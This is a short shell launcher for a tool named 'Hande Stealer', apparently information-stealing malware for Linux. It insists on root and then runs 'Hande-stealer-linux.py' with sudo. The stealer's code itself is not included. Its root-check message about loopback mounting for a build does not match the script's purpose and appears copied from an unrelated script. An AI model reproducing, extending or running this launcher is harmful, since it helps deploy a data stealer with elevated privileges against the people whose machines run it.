#!/bin/sh

echo "Hande Stealer"
if test "`whoami`" != "root" ; then
	echo "You must be logged in as root to build (for loopback mounting)"
	echo "Enter 'su' or 'sudo bash' to switch to root"
	exit
fi

sudo python Hande-stealer-linux.py
